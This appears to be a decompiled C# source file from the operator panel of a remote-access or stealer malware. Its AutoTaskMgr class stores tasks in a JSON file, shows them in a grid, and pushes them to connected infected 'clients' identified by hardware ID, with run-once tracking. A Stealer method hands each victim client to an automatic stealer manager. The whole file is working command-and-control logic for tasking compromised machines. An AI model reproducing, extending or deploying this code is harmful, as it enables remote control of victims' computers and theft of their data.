using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Threading.Tasks;
using System.Windows.Forms;
using Newtonsoft.Json;
using Server.Connectings;

namespace Server.Helper.Tasks;

internal class AutoTaskMgr
{
	public static object SYNC = new object();

	public static void RunTasks(Clients clients)
	{
		if (!File.Exists("local\\Tasks.json"))
		{
			return;
		}
		lock (SYNC)
		{
			foreach (object item2 in (IEnumerable)Program.form.dataGridView2.Rows)
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)item2;
				Task item = (Task)dataGridViewRow.Tag;
				if (item == null)
				{
					continue;
				}
				if (item.TasksRunsed == null)
				{
					item.TasksRunsed = new List<string>();
				}
				if (item.RunOnce)
				{
					bool flag2 = false;
					foreach (string item3 in item.TasksRunsed)
					{
						if (item3 == clients.Hwid)
						{
							flag2 = true;
							break;
						}
					}
					if (flag2)
					{
						continue;
					}
					System.Threading.Tasks.Task.Run(delegate
					{
						try
						{
							if (clients != null && clients.itsConnect)
							{
								clients.Send(item.task);
								lock (SYNC)
								{
									if (!item.TasksRunsed.Contains(clients.Hwid))
									{
										item.TasksRunsed.Add(clients.Hwid);
									}
									return;
								}
							}
						}
						catch
						{
						}
					});
				}
				else
				{
					System.Threading.Tasks.Task.Run(delegate
					{
						try
						{
							if (clients != null && clients.itsConnect)
							{
								clients.Send(item.task);
							}
						}
						catch
						{
						}
					});
				}
				item.Runs++;
				dataGridViewRow.Cells[1].Value = item.Runs;
			}
		}
	}

	public static void Import()
	{
		foreach (Task task in JsonConvert.DeserializeObject<List<Task>>(File.ReadAllText("local\\Tasks.json")))
		{
			DataGridViewRow dataGridViewRow = new DataGridViewRow();
			dataGridViewRow.Tag = task;
			dataGridViewRow.DefaultCellStyle.ForeColor = FormMaterial.PrimaryColor;
			dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
			{
				Value = task.RunOnce
			});
			dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
			{
				Value = task.Runs
			});
			dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
			{
				Value = task.Name
			});
			Program.form.dataGridView2.Invoke((MethodInvoker)delegate
			{
				Program.form.dataGridView2.Rows.Add(dataGridViewRow);
			});
		}
	}

	public static void Export()
	{
		List<Task> list = new List<Task>();
		foreach (DataGridViewRow dataGridViewRow in (IEnumerable)Program.form.dataGridView2.Rows)
		{
			list.Add(dataGridViewRow.Tag as Task);
		}
		File.WriteAllText("local\\Tasks.json", JsonConvert.SerializeObject(list));
	}

	public static void AppendTask(Task item)
	{
		DataGridViewRow dataGridViewRow = new DataGridViewRow();
		dataGridViewRow.Tag = item;
		dataGridViewRow.DefaultCellStyle.ForeColor = FormMaterial.PrimaryColor;
		dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
		{
			Value = item.RunOnce
		});
		dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
		{
			Value = item.Runs
		});
		dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
		{
			Value = item.Name
		});
		Program.form.dataGridView2.Invoke((MethodInvoker)delegate
		{
			Program.form.dataGridView2.Rows.Add(dataGridViewRow);
		});
		Clients[] array = Program.form.ClientsAll();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				RunTasks(clients);
			});
		}
	}

	public static void Stealer(Clients clients)
	{
		AutoStealerManager.ProcessClient(clients);
	}
}
